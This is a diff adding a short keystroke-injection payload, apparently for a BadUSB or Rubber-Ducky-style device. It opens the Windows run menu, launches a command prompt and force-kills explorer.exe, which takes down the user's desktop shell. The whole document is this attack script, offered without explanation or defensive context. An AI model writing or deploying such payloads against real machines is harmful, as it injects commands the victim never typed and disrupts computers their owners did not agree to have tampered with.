@@ -1,0 +1,7 @@
+GUI
+delay 1
+write cmd
+enter
+delay 1
+write taskkill /f /im explorer.exe
+enter
